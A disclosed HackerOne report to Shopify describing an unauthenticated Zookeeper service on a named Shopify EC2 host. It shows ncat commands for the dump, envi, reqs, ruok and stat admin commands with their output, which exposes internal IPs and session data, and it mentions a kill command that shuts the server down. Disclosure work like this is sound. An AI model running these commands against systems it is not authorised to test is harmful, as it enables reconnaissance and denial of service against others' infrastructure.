# Unauthorized access to Zookeeper on http://locutus-zk3.ec2.shopify.com:2181

## Report Details
- **Report ID**: 154369
- **URL**: https://hackerone.com/reports/154369
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-27T15:02:34.524Z
- **Disclosed**: 2016-08-08T23:32:31.876Z

## Reporter
- **Username**: mico02
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
What is Zookeeper?
====================
Zookeeper is a coordination service for distributed applications. It allows common services such as naming, synchronisation, configuration management and group services to be managed by a simple interface and It uses a data model of File System on an operating system.

How does Zookeeper relate to Shopify?
====================
While scanning for Open ports on http://locutus-zk3.ec2.shopify.com, I came across port 2181. Grabbing the banner on this port revealed that it's running Zookeeper:
```
Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
```
So you found an open, how does this affect Shopify?
====================
Zookeeper installations does not deploy any authentication by default, this makes it very easy for remote attackers to abuse Zookeeper installations, gather information and cause havoc inside Zookeeper clusters by killing the servers (my tests showed that the kill command is available on this instance). After some testing, I found that I was able to run all the commands that are only allowed to be run by admins! Here is a sample of the commands I ran:

>dump: Lists the outstanding sessions and ephemeral nodes. This only works on the leader.

```
$ echo dump |ncat 52.2.164.229 2181
SessionTracker dump:
Global Sessions(7):
0x1053c5850800023       4000ms
0x1053c5850800024       4000ms
0x2000b1ecdeb0160       4000ms
0x2000b1ecdeb0161       4000ms
0x2000b1ecdeb0162       4000ms
0x3055d0251540008       4000ms
0x3055d0251540009       4000ms
ephemeral nodes dump:
Sessions with Ephemerals (5):
0x1053c5850800024:
        /borg/locutus/agents/061e4b6/10.92.1.192:9257
0x1053c5850800023:
        /borg/locutus/agents/061e4b6/10.92.1.118:9257
0x3055d0251540008:
        /borg/locutus/agents/061e4b6/10.92.1.120:9257
0x2000b1ecdeb0162:
        /borg/locutus/agents/061e4b6/10.92.1.87:9257
0x3055d0251540009:
        /borg/locutus/agents/061e4b6/10.92.1.10:9257
Connections dump:
Connections Sets (2)/(7):
Ncat: An established connection was aborted by the software in your host machine. .
```

>envi: Print details about serving environment.

```
$ echo envi |ncat 52.2.164.229 2181
Environment:
zookeeper.version=3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
host.name=locutus-zk3.ec2.shopify.com
java.version=1.7.0_79
java.vendor=Oracle Corporation
java.home=/usr/lib/jvm/java-7-openjdk-amd64/jre
java.class.path=:/etc/zookeeper-locutus:/usr/src/zookeeper-locutus/zookeeper/zookeeper-3.5.1-alpha.jar:/usr/src/zookeeper-locutus/zookeeper/lib/commons-cli-1.2.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-core-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jackson-mapper-asl-1.9.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/javacc.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jetty-util-6.1.26.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-0.9.94.jar:/usr/src/zookeeper-locutus/zookeeper/lib/jline-2.11.jar:/usr/src/zookeeper-locutus/zookeeper/lib/log4j-1.2.16.jar:/usr/src/zookeeper-locutus/zookeeper/lib/netty-3.7.0.Final.jar:/usr/src/zookeeper-locutus/zookeeper/lib/servlet-api-2.5-20081211.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-api-1.7.5.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.6.1.jar:/usr/src/zookeeper-locutus/zookeeper/lib/slf4j-log4j12-1.7.5.jar
java.library.path=/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib
java.Ncat: An established connection was aborted by the software in your host machine.
```

>kill: Shuts down the server. (Haven't tried this one)
```
```

>reqs: List outstanding requests.

```
$ echo reqs |ncat 52.2.164.229 2181
close: Result too large
```

>ruok: Tests if server is running in a non-error state. The server will respond with imok if it is running. Otherwise it will not respond at all.
```
$ echo ruok |ncat 52.2.164.229 2181
imok
```

>stat: Lists statistics about performance and connected clients.

```
$ echo stat |ncat 52.2.164.229 2181
Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
Clients:
 /10.92.1.120:35986[1](queued=0,recved=2238053,sent=2238053)
 /10.92.1.10:48851[1](queued=0,recved=2235979,sent=2235979)
 /10.92.1.242:54198[1](queued=0,recved=713623,sent=713623)
 /86.136.100.60:11057[0](queued=0,recved=1,sent=0)
 /10.92.1.253:60423[1](queued=0,recved=2204714,sent=2204714)
 /10.92.1.192:47933[1](queued=0,recved=1926008,sent=1926008)
 /10.92.1.118:37256[1](queued=0,recved=129470,sent=129470)

Latency min/avg/max: 0/0/981
Received: 25813570
Sent: 25813622
Connections: 7
Outstanding: 0
Zxid: 0xc2000016ad
Mode: follower
Node count: 192
```

## Attachments
No attachments
